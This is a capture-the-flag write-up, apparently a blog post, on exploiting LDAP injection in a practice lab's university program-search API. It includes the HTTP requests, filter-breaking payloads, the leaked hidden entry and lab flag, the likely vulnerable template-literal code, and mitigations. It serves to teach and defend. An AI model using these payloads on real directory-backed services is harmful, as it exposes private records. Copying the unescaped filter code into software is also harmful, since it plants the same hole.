---
title: "LDAP Injection – Hidden Registrar Archive Disclosure | Saint Croix University"
date: 2026-05-15 16:15:00 +0000
categories: [Web Security, LDAP]
tags: [ldap-injection, express, openldap, injection, information-disclosure, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/saint-croix-university.webp
  alt: Saint Croix University LDAP Injection Lab
---

# Overview

Saint Croix University exposed a vulnerable OpenLDAP-backed search functionality through its public academic program directory. User-controlled input from the `q` parameter was directly concatenated into an LDAP filter without proper sanitization or escaping.

By abusing the LDAP filter structure, it was possible to manipulate the backend query logic and retrieve hidden internal LDAP objects that were never intended to appear in public search results.

The vulnerability ultimately exposed an internal registrar archive entry containing the lab flag.

## Lab Link

- Lab: [Slate Quarry – WebVerse Labs](https://dashboard.webverselabs-pro.com/mystery-challenges/saint-croix)

---

# Objective

Exploit the vulnerable LDAP-backed search functionality to retrieve hidden internal LDAP entries and obtain the flag.

---

# Reconnaissance

The application exposed a searchable academic program directory:

```http
GET /academics/programs?q=computer HTTP/2
Host: target
```

The page dynamically loaded results through the following API endpoint:

```http
GET /api/programs/search?q=computer HTTP/2
Host: target
```

The API returned JSON-based program results.

---

# Initial Wildcard Enumeration

A wildcard search was performed to understand how the backend handled special LDAP characters.

Request:

```http
GET /api/programs/search?q=* HTTP/2
Host: target
```

Response:

```json
{
  "query":"*",
  "count":23
}
```

The request returned all publicly visible programs, indicating that wildcard characters were being interpreted directly by the LDAP backend.

This strongly suggested LDAP-backed filtering behavior.

---

# LDAP Error Disclosure

To confirm LDAP injection, malformed filter syntax was supplied.

Request:

```http
GET /api/programs/search?q=*)(|(cn=*)) HTTP/2
Host: target
```

Response:

```json
{
  "error":"Bad search filter — check your query syntax.",
  "backend":"openldap",
  "ldap_message":"missing opening parentheses",
  "filter_template":"(&(objectClass=applicationProcess)(|(cn=*Q*)(displayName=*Q*)(ou=*Q*)(description=*Q*)(adminNote=*Q*)))"
}
```

This disclosure was extremely valuable because it exposed:
- backend technology
- exact LDAP filter structure
- injectable query position
- hidden searchable attributes

The leaked filter template:

```ldap
(&(objectClass=applicationProcess)
 (|(cn=*Q*)
   (displayName=*Q*)
   (ou=*Q*)
   (description=*Q*)
   (adminNote=*Q*)))
```

---

# Injection Testing

Several payloads were tested to understand how the filter behaved when parentheses and operators were injected.

---

## Payload 1

Request:

```http
GET /api/programs/search?q=*)(|(objectClass=*)) HTTP/2
Host: target
```

Response:

```json
{
  "error":"Bad search filter — check your query syntax.",
  "ldap_message":"missing opening parentheses"
}
```

The payload over-closed the filter and broke LDAP syntax.

---

## Payload 2

Request:

```http
GET /api/programs/search?q=*)(cn=* HTTP/2
Host: target
```

Response:

```json
{
  "query":"*)(cn=*",
  "count":23
}
```

This payload successfully returned all public entries again.

The behavior confirmed:
- filter manipulation was occurring
- the LDAP parser tolerated partially malformed logic
- injected operators could affect query behavior

---

# Exploitation

The final payload targeted the hidden `adminNote` attribute leaked earlier through the verbose error message.

Payload:

```text
*)(|(adminNote=*
```

Request:

```http
GET /api/programs/search?q=*)(|(adminNote=* HTTP/2
Host: target
```

---

# Successful Response

The injected request returned:

```json
{
  "query":"*)(|(adminNote=*",
  "count":24
}
```

The result count increased from:

```json
"count":23
```

to:

```json
"count":24
```

indicating that a previously hidden LDAP object had been exposed.

---

# Hidden Internal LDAP Object

The response revealed an undocumented internal LDAP entry:

```json
{
  "cn":"registrar-archive",
  "displayName":"Records Office Internal Archive",
  "ou":"Office of the Registrar",
  "info":"internal",
  "description":"System-internal archive bucket. Do not link in public navigation; staff access via the registrar's portal only.",
  "adminNote":"WEBVERSE{212bee823180e73336e20bc1e5b269e2}"
}
```

The sensitive `adminNote` attribute contained the lab flag.

---

# Flag

```text
WEBVERSE{212bee823180e73336e20bc1e5b269e2}
```

---

# Root Cause

The application dynamically constructed LDAP filters using unsanitized user-controlled input.

Likely vulnerable implementation:

```js
filter = `(&(objectClass=applicationProcess)
(|(cn=*${q}*)
(displayName=*${q}*)
(ou=*${q}*)
(description=*${q}*)
(adminNote=*${q}*)))`
```

Because LDAP special characters were not escaped properly, attackers could manipulate filter logic using:

```text
*
(
)
|
&
```

---

# Impact

Successful exploitation allowed:
- LDAP query manipulation
- exposure of hidden internal directory objects
- disclosure of sensitive internal attributes
- access to undocumented records

In real-world systems, LDAP injection may lead to:
- authentication bypass
- privilege escalation
- credential disclosure
- Active Directory enumeration
- internal directory mapping

---

# Mitigation

## Escape LDAP Special Characters

Always sanitize and escape user-controlled input before embedding it into LDAP filters.

Example:

```js
ldap.escapeFilter(userInput)
```

---

## Avoid Dynamic Filter Construction

Do not construct LDAP filters using direct string concatenation or template literals.

---

## Disable Verbose Error Messages

The application leaked:
- LDAP parser errors
- backend technology
- internal filter templates

Production systems should never expose such information to users.

---

## Restrict Sensitive Attributes

Attributes such as:

```text
adminNote
```

should never be searchable from public-facing endpoints.

---

# Real-World Insight

LDAP injection vulnerabilities remain common in legacy enterprise applications integrating:
- OpenLDAP
- Active Directory
- SSO platforms
- internal employee directories

Developers frequently underestimate LDAP injection risks compared to SQL injection, resulting in dangerous filter construction patterns and sensitive directory exposure.

This lab demonstrated how a seemingly harmless search feature could expose hidden internal records through improper LDAP filter handling.